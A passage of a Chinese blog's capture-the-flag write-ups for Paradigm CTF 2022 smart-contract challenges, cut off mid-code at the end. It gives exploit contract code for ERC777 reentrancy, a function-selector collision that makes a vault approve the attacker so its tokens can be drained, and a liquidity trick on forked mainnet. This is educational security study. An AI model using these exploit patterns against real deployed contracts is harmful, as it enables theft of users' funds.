amount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们需要控制好回调函数的条件，什么时候重入什么时候停止重入。在这里，我们重入一次就好，重入一次就可以获得很大的shares。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// PNT的回调函数</span><br><span class="line">function tokensReceived(</span><br><span class="line">    address operator,</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 amount,</span><br><span class="line">    bytes calldata userData,</span><br><span class="line">    bytes calldata operatorData</span><br><span class="line">)external&#123;</span><br><span class="line">    if (amount == prevAmount) &#123;</span><br><span class="line">        console.log(&quot;   balance(vault)-1:&quot;,amount);</span><br><span class="line">        uint256 share = HintFinanceVault(vault).deposit(amount - 2); // 这样就不符合amount == prevAmount而再次重入了</span><br><span class="line">        console.log(&quot;   attack&#x27;s share:&quot;,share);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// AMP的回调函数</span><br><span class="line">function tokensReceived(</span><br><span class="line">    bytes4 functionSig,</span><br><span class="line">    bytes32 partition,</span><br><span class="line">    address operator,</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 value,</span><br><span class="line">    bytes calldata data,</span><br><span class="line">    bytes calldata operatorData</span><br><span class="line">)external&#123;</span><br><span class="line">    if (value == prevAmount) &#123;</span><br><span class="line">        console.log(&quot;   balance(vault)-1:&quot;,value);</span><br><span class="line">        uint256 share = HintFinanceVault(vault).deposit(value - 2); // 这样就不符合amount == prevAmount而再次重入了</span><br><span class="line">        console.log(&quot;   attack&#x27;s share:&quot;,share);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终扣除一笔小的share，但授权很大数目的shares，然后我们可以使用正常的<code>withdraw()</code>取钱即可</p><h4 id="3-2ERC20"><a href="#3-2ERC20" class="headerlink" title="3.2ERC20"></a>3.2ERC20</h4><h5 id="发现漏洞-1"><a href="#发现漏洞-1" class="headerlink" title="发现漏洞"></a>发现漏洞</h5><p>针对 ERC20，有一种常见的攻击模式，即想办法使得 token 的 owner 给 hacker 进行 approve 操作，通常这是一种钓鱼手法，但是在很多支持 flashloan 的合约中，可以让合约来给我进行 approve。这样就可以在满足 flashloan 的前提下，即不直接拿走 vault 的 token，但是让其对 hacker 进行 approve 了。</p><p>所以本题的思路是：如何让 vault 合约作为 msg.sender, 调用 token 合约的 approve 方法。可以利用 flashloan 的 回调函数来实现，但是该 回调函数写死了，是<code>onHintFinanceFlashloan()</code>,并不是一个可以任意传的值，即不是<code>address(caller).call(data)</code></p><p>SAND合约没有实现<code>onHintFinanceFlashloan()</code>，并且它的approve方法逻辑是正确的无可挑剔不可利用。但是认真找一下，它还存在这样一个父合约: ERC20BasicApproveExtension.sol，它有一个函数可以进行approve：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function approveAndCall(</span><br><span class="line">    address target,</span><br><span class="line">    uint256 amount,</span><br><span class="line">    bytes calldata data</span><br><span class="line">) external payable returns (bytes memory) &#123;</span><br><span class="line">    require(</span><br><span class="line">        BytesUtil.doFirstParamEqualsAddress(data, msg.sender),</span><br><span class="line">        &quot;first param != sender&quot;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    _approveFor(msg.sender, target, amount);</span><br><span class="line"></span><br><span class="line">    // solium-disable-next-line security/no-call-value</span><br><span class="line">    (bool success, bytes memory returnData) = target.call.value(msg.value)(data);</span><br><span class="line">    require(success, string(returnData));</span><br><span class="line">    return returnData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>approveAndCall</code>函数也会让调用者向对应地址进行approve，还会根据传入的data去target地址中调用相应的函数。如果我们能让Vault合约调用这个函数或者approve函数，即可拿到权限。看起来好像并没有能让Vault调用这两个函数的方法，flashloan中唯一存在的一个外部函数调用就是他自己的回退函数<code>_onHintFinanceFlashloan</code>。</p><p>函数选择器碰撞！但经过对比，发现<code>approveAndCall</code>和<code>onHintFinanceFlashloan</code>的函数选择器是相同的，也就是说，在<code>flashloan()</code>函数中由于函数选择器相同的原因，可以调用到<code>approveAndCall</code>函数，从而达到目的。也就是我们说的函数选择器碰撞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cast sig &quot;approveAndCall(address,uint256,bytes)&quot;</span><br><span class="line"># 0xcae9ca51</span><br><span class="line"></span><br><span class="line">cast sig &quot;onHintFinanceFlashloan(address,address,uint256,bool,bytes)&quot;</span><br><span class="line"># 0xcae9ca51</span><br></pre></td></tr></table></figure><h5 id="利用漏洞-1"><a href="#利用漏洞-1" class="headerlink" title="利用漏洞"></a>利用漏洞</h5><p>1.</p><p>针对 calldata 进行编码时，要由外到内，首先编码出 <code>approveAndCall()</code> 中传入的参数</p><ul><li>token应该是SAND合约</li><li>第一个参数是vault代表要调用vault中的函数</li><li>第二个参数是amount代表要授权给msg.sender的金额</li><li>第三个参数是data代表要调用vault中的某个方法</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SandLike(token).approveAndCall(vault, amount, data);  </span><br></pre></td></tr></table></figure><p>这个 data 是调用 <code>flashloan()</code> 的 calldata，即 data 要满足<code>flashloan(address token, uint256 amount, bytes calldata data)</code>这个函数；则写成如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes memory data = abi.encodeWithSelector(HintFinanceVault.flashloan.selector, address(this), amount, innerData);</span><br></pre></td></tr></table></figure><p>2.</p><p>然后，在来查看 innerData 的编码方式，他需要同时满足<code>onHintFinanceFlashloan()</code>和<code>approveAndCall()</code>两个函数；将两个函数的参数对齐如下：</p><div class="table-container"><table><thead><tr><th>approveAndCall()</th><th>onHintFinanceFlashloan()</th><th>偏移</th></tr></thead><tbody><tr><td>address target</td><td>address token</td><td>0x20</td></tr><tr><td>uint256 amount</td><td>address factory</td><td>0x40</td></tr><tr><td>0xa0(要告诉方法跳到innerdata那里)</td><td>uint256 amount</td><td>0x60</td></tr><tr><td>0（对齐位置，补0即可）</td><td>bool isUnderlyingOrReward</td><td>0x80</td></tr><tr><td>bytes memory innerdata</td><td>bytes memory data</td><td>0xa0</td></tr></tbody></table></div><p>因此，（第三行）这里的amount和factory就是授权给token 的金额，（第四行）而amount是要告诉方法跳到innerdata那里</p><p>3.</p><p>接下来我们要编码innerdata。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">function approveAndCall(</span><br><span class="line">    address target,</span><br><span class="line">    uint256 amount,</span><br><span class="line">    bytes calldata data</span><br><span class="line">) external payable returns (bytes memory) &#123;</span><br><span class="line">    require(</span><br><span class="line">        BytesUtil.doFirstParamEqualsAddress(data, msg.sender),</span><br><span class="line">        &quot;first param != sender&quot;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    _approveFor(msg.sender, target, amount);</span><br><span class="line"></span><br><span class="line">    // solium-disable-next-line security/no-call-value</span><br><span class="line">    (bool success, bytes memory returnData) = target.call.value(msg.value)(data);</span><br><span class="line">    require(success, string(returnData));</span><br><span class="line">    return returnData;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function doFirstParamEqualsAddress(bytes memory data, address _address)</span><br><span class="line">    internal</span><br><span class="line">    pure</span><br><span class="line">    returns (bool)</span><br><span class="line">&#123;</span><br><span class="line">    if (data.length &lt; (36 + 32)) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    uint256 value;</span><br><span class="line">    assembly &#123;</span><br><span class="line">        value := mload(add(data, 36))</span><br><span class="line">    &#125;</span><br><span class="line">    return value == uint256(_address);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据代码我们可以得到：</p><ul><li>data中的第一个参数必须是msg.sender，因为是金库调用的，因此第一个参数必须是金库的地址。</li><li><code>doFirstParamEqualsAddress()</code>要求参数的长度必须大于或等于68，也就是说我们的参数至少是两个</li><li>innerdata必须是一个可以执行的方法，而且必须执行成功，那么我们可以让它来执行一个静态方法比如<code>balanceOf()</code></li></ul><p>因此编码可以得到如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes memory innerData = abi.encodeWithSelector(ERC20Like.balanceOf.selector, address(vault), 0);</span><br></pre></td></tr></table></figure><p>4.</p><p>为了闪电贷执行成功，需要攻击合约实现<code>balanceOf()</code>和<code>transfer(</code>)方法，因为闪电贷会执行token的这两个方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function transfer(address, uint256) external returns (bool) &#123;</span><br><span class="line">    // 在闪电贷方法中有一行： ERC20Like(token).transfer(msg.sender, amount);</span><br><span class="line">    // 因此攻击合约要实现这个方法进行伪装</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function balanceOf(address) external view returns (uint256) &#123;</span><br><span class="line">    // 在闪电贷方法中有一行： ERC20Like(token).balanceOf(address(this));</span><br><span class="line">    // 因此攻击合约要实现这个方法进行伪装</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5.授权成功后，就直接转账即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SandLike(token).approveAndCall(vault, amount, data);  </span><br><span class="line">// vault approve给本合约之后，我们就可以用transferFrom进行转账了</span><br><span class="line">ERC20Like(token).transferFrom(vault, address(this), ERC20Like(token).balanceOf(vault));</span><br></pre></td></tr></table></figure><h4 id="3-3一些其他的限制"><a href="#3-3一些其他的限制" class="headerlink" title="3.3一些其他的限制"></a>3.3一些其他的限制</h4><p>根据ERC777的规则，我们需要额外增加这些内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// AMP合约中有一个这个东西：string internal constant AMP_TOKENS_RECIPIENT = &quot;AmpTokensRecipient&quot;;</span><br><span class="line">// 调用 ERC1820 注册表合约的 setInterfaceImplementer函数 注册AmpTokensRecipient接口实现（接口的实现是自身），</span><br><span class="line">// 这样在收到代币时，会回调 tokensReceived函数</span><br><span class="line">EIP1820Like(EIP1820).setInterfaceImplementer(address(this), keccak256(&quot;AmpTokensRecipient&quot;), address(this));</span><br><span class="line">// PNT合约中有一个这个东西：bytes32 constant private _TOKENS_RECIPIENT_INTERFACE_HASH = 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b;</span><br><span class="line">// 调用 ERC1820 注册表合约的 setInterfaceImplementer函数 注册ERC777TokensRecipient接口实现（接口的实现是自身），</span><br><span class="line">// 这样在收到代币时，会回调 tokensReceived函数</span><br><span class="line">EIP1820Like(EIP1820).setInterfaceImplementer(address(this), keccak256(&quot;ERC777TokensRecipient&quot;), address(this));</span><br></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>见GitHub仓库</p><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><ul><li>本题考察了ERC777的钩子函数进行重入攻击和ERC20的approve钓鱼授权，我们需要了解EIP-1820和EIP-777的工作原理。做本题之前并不懂，然后现学。</li><li>题目fork了主网中的数据，因此本题有很强的现实应用性，没有比赛环境，一样可以根据区块高度来fork主网实现重现。需要懂得如何复现题目的环境，配置好题目之后再进行攻击，foundry非常牛！</li><li>函数选择器碰撞的题目还是头一次做，需要注意calldata的位置和编码要求，并且构造的时候需要满足各种条件的限制，比如本题中的<code>doFirstParamEqualsAddress()</code>就偷偷要求至少得两个参数。</li><li>为了完成攻击，还要做各种的小操作来完成攻击，比如攻击合约要实现<code>transfer()</code>和<code>balanceOf()</code>（闪电贷要求）</li><li>总的来说，题目很棒，当然我是看别人的题解的，但还是受益匪浅了，最终也是完全理解的思路和攻击方法。还是那句话，得看很多积累攻击类型和经验</li></ul>]]></content>
      
      
      <categories>
          
          <category> 14.Paradigm CTF 2022 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>02.rescue</title>
      <link href="/2023/09/18/14.Paradigm%20CTF%202022/02.rescue/"/>
      <url>/2023/09/18/14.Paradigm%20CTF%202022/02.rescue/</url>
      
        <content type="html"><![CDATA[<h1 id="rescue"><a href="#rescue" class="headerlink" title="rescue"></a>rescue</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>本题的任务：不小心将10WETH转到了合约masterchef中，我们需要将他归零。</p><p>合约中只有<code>swapTokenForPoolToken()</code>可以调用，它会将一个tokenIn传入，然后对半分换成poolId这个ID对应的池子中的两个代币。其实tokenIn的值只要不为0就可以，因为添加流动性的时候amountDesired设置成了masterchef拥有的最大代币数目，tokenIn的数量不与token0和token1挂钩。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function swapTokenForPoolToken(uint256 poolId, address tokenIn, uint256 amountIn, uint256 minAmountOut) external &#123;</span><br><span class="line">       (address lpToken,,,) = masterchef.poolInfo(poolId);</span><br><span class="line">       address tokenOut0 = UniswapV2PairLike(lpToken).token0();</span><br><span class="line">       address tokenOut1 = UniswapV2PairLike(lpToken).token1();</span><br><span class="line"></span><br><span class="line">       ERC20Like(tokenIn).approve(address(router), type(uint256).max);</span><br><span class="line">       ERC20Like(tokenOut0).approve(address(router), type(uint256).max);</span><br><span class="line">       ERC20Like(tokenOut1).approve(address(router), type(uint256).max);</span><br><span class="line">       ERC20Like(tokenIn).transferFrom(msg.sender, address(this), amountIn);</span><br><span class="line"></span><br><span class="line">       // swap for both tokens of the lp pool</span><br><span class="line">       _swap(tokenIn, tokenOut0, amountIn / 2);</span><br><span class="line">       _swap(tokenIn, tokenOut1, amountIn / 2);</span><br><span class="line"></span><br><span class="line">       // add liquidity and give lp tokens to msg.sender</span><br><span class="line">       _addLiquidity(tokenOut0, tokenOut1, minAmountOut);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>masterchef添加流动性的时候是将整个合约拥有的代币设置进去，这就意味着，只要我们的token1够多，那么token0就会被归零。（原因是uniswapV2的添加流动性方法中，先是判断token1的数目够不够换token0）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function _addLiquidity(address token0, address token1, uint256 minAmountOut) internal &#123;</span><br><span class="line">    (,, uint256 amountOut) = router.addLiquidity(</span><br><span class="line">        token0, </span><br><span class="line">        token1, </span><br><span class="line">        ERC20Like(token0).balanceOf(address(this)), </span><br><span class="line">        ERC20Like(token1).balanceOf(address(this)), </span><br><span class="line">        0, </span><br><span class="line">        0, </span><br><span class="line">        msg.sender, </span><br><span class="line">        block.timestamp</span><br><span class="line">    );</span><br><span class="line">    require(amountOut &gt;= minAmountOut);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>因此，我们选取一个币对池子中token0是WETH的，这样的话，只要我们拥有的token1足够多，就可以将WETH归零。</strong></p><p>如果不好理解，那我举个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">由于不知道题目中的池子比例, 我们假设池子里有 WETH 和 USDT 各50个</span><br><span class="line"></span><br><span class="line">                WETH  USDT             得到                   k</span><br><span class="line">池子初始         50     50                                    2500</span><br><span class="line">    输入        10     ?                             (这一步用于得到一定数量的USDT)</span><br><span class="line">池子最终         60    2500/60 ~=42     50-42=8               2500</span><br><span class="line">    到手         0     8                             (这里得到的USDT会给到masterchef)</span><br><span class="line"></span><br><span class="line">masterchef      10    8</span><br><span class="line">                60    48                            (此时48&gt;42, 说明所需的USDT已经足够)</span><br><span class="line"></span><br><span class="line">先判断amountDesired=10的时候USDT够不够, 算出来够, 因此会将10个WETH换成USDT, 多的USDT并不会转发</span><br><span class="line">我们这题选取的token0是WETH(10个), 那么只要我们有大于比例的USDT就可以了</span><br><span class="line"></span><br><span class="line">反正这题就是要保证10个WETH要被完全换出去, USDT可以不被全部换走，有点残留</span><br><span class="line"></span><br><span class="line">同时, 本题中用于平分两半的token可以是任意数量, 因为masterchef会将所有的token0和token1作为amountDesired</span><br></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>原题目题解如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">contract Rescue &#123;</span><br><span class="line">    UniswapV2RouterLike public router = UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);</span><br><span class="line"></span><br><span class="line">    WETH9 public weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);</span><br><span class="line"></span><br><span class="line">    ERC20Like public usdc = ERC20Like(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);</span><br><span class="line">    IPair public usdcweth = IPair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);</span><br><span class="line"></span><br><span class="line">    IPair public usdtweth = IPair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function rescue(address setup) public &#123;</span><br><span class="line">        // 获取误转入10WETH的合约实例</span><br><span class="line">        address target = ISetup(setup).mcHelper();</span><br><span class="line">        </span><br><span class="line">        // 本合约获得11WETH，因为是1：1兑换</span><br><span class="line">        weth.deposit&#123;value: 11 ether&#125;();</span><br><span class="line">        // 向 USDT/WETH 池子转10WETH</span><br><span class="line">        weth.transfer(address(usdtweth), 10 ether);</span><br><span class="line">        // 向 USDC/WETH 池子转1WETH</span><br><span class="line">        weth.transfer(address(usdcweth), 1 ether);</span><br><span class="line"></span><br><span class="line">        // 获取池子的两个token的比例，reserveUSDT是池子中剩余的USDT数量，reserveWETH是池子中剩余的WETH数量</span><br><span class="line">        (uint112 reserveUSDT, uint112 reserveWETH, ) = usdtweth.getReserves();</span><br><span class="line">        // 用10个WETH换取若干个USDT</span><br><span class="line">        uint256 amount = router.getAmountOut(10 ether, reserveWETH, reserveUSDT);</span><br><span class="line">        // USDT/WETH 池子中，用WETH换USDT，结果是得到amount数量的USDT</span><br><span class="line">        usdtweth.swap(amount, 0, target, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">        // 获取池子的两个token的比例，reserveWETH是池子中剩余的WETH数量，reserveUSDC是池子中剩余的USDC数量</span><br><span class="line">        (reserveWETH, uint112 reserveUSDC, ) = usdcweth.getReserves();</span><br><span class="line">        // 用1个WETH换取若干个USDC</span><br><span class="line">        amount = router.getAmountOut(1 ether, reserveWETH, reserveUSDC);</span><br><span class="line">        // WETH/USDC 池子中，用WETH换USDC，结果是得到amount数量的USDC</span><br><span class="line">        usdcweth.swap(0, amount, address(this), &quot;&quot;);</span><br><span class="line"></span><br><span class="line">        // 要授权，这样池子才能转走你的USDC</span><br><span class="line">        usdc.approve(target, usdc.balanceOf(address(this)));</span><br><span class="line">        // 1是指第一个交易对，即USDT/WETH，将USDC放入然后对半分</span><br><span class="line">        IMasterChefHelper(target).swapTokenForPoolToken(1, address(usdc), usdc.balanceOf(address(this)), 0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于比赛已经过了，没有环境给我测试，因此我将写个测试来演绎本题的原理，脚本放在GitHub仓库了</p><blockquote><p>masterchef一开始拥有10WETH，我们需要将它归零，任何人可以调用它的addLiquidity来添加流动性<br>因此，我们打算用一种叫做COMP的ERC20代币，送给masterchef一定数量的COMP，<br>然后调用addLiquidity给COMP/WETH池子添加流动性，这样就可以将masterchef的WETH归零</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">// 我们模拟题目：假设masterchef一开始拥有10WETH，我们需要将它归零，任何人可以调用它的_addLiquidity来添加流动性</span><br><span class="line">// 因此，我们打算用一种叫做COMP的ERC20代币，送给masterchef一定数量的COMP，</span><br><span class="line">// 然后调用_addLiquidity给COMP/WETH池子添加流动性，这样就可以将masterchef的WETH归零</span><br><span class="line"></span><br><span class="line">contract rescurTest is Test &#123;</span><br><span class="line"></span><br><span class="line">    WETH9 comp = WETH9(0xc00e94Cb662C3520282E6f5717214004A7f26888);</span><br><span class="line">    WETH9 weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);</span><br><span class="line">    Uni_Router_V2 router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);</span><br><span class="line"></span><br><span class="line">    Masterchef public masterchef;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;mainnet&quot;, 16_401_180);</span><br><span class="line">        vm.label(address(comp), &quot;comp&quot;);</span><br><span class="line">        vm.label(address(weth), &quot;weth&quot;);</span><br><span class="line">        vm.label(address(router), &quot;router&quot;);</span><br><span class="line">        vm.label(address(masterchef), &quot;masterchef&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_setToZero() public payable&#123;</span><br><span class="line"></span><br><span class="line">        // 此时masterchef合约拥有10WETH，我们需要将他归零</span><br><span class="line">        masterchef = new Masterchef();</span><br><span class="line">        weth.deposit&#123;value: 10&#125;();</span><br><span class="line">        weth.transfer(address(masterchef), 10); </span><br><span class="line"></span><br><span class="line">        // 用一个拥有COMP的账户给masterchef转1000的COMP，根据本区块中的币对比例，1000COMP完全可以换10WETH</span><br><span class="line">        vm.startPrank(0x2775b1c75658Be0F640272CCb8c72ac986009e38);</span><br><span class="line">        comp.transfer(address(masterchef),1000);</span><br><span class="line">        vm.stopPrank();</span><br><span class="line"></span><br><span class="line">        // 检查masterchef是否有10 WETH</span><br><span class="line">        assertEq(weth.balanceOf(address(masterchef)),10);</span><br><span class="line">        console.log(&quot;[before] WETH&quot;,weth.balanceOf(address(masterchef)));</span><br><span class="line">        </span><br><span class="line">        // 检查masterchef是否有 1000 COMP</span><br><span class="line">        assertEq(comp.balanceOf(address(masterchef)),1000);</span><br><span class="line">        console.log(&quot;[before] COMP&quot;,comp.balanceOf(address(masterchef)));</span><br><span class="line"></span><br><span class="line">        // 添加流动性，这会使我们换走所有的token0，即WETH</span><br><span class="line">        masterchef._addLiquidity(address(weth), address(comp), 0);</span><br><span class="line"></span><br><span class="line">        // 检查masterchef的WETH是否为0，并且COMP会有剩余</span><br><span class="line">        assertEq(weth.balanceOf(address(masterchef)),0);</span><br><span class="line">        console.log(&quot;[after] WETH&quot;,weth.balanceOf(address(masterchef)));</span><br><span class="line">        console.log(&quot;[after] COMP&quot;,comp.balanceOf(address(masterchef)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Masterchef&#123;</span><br><span class="line">    Uni_Router_V2 router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);</span><br><span class="line"></span><br><span class="line">    function _addLiquidity(address token0, address token1, uint256 minAmountOut) public &#123;</span><br><span class="line">        WETH9(token0).approve(address(router),type(uint256).max);</span><br><span class="line">        WETH9(token1).approve(address(router),type(uint256).max);</span><br><span class="line">    (,, uint256 amountOut) = router.addLiquidity(</span><br><span class="line">        token0, </span><br><span class="line">        token1, </span><br><span class="line">        WETH9(token0).balanceOf(address(this)), 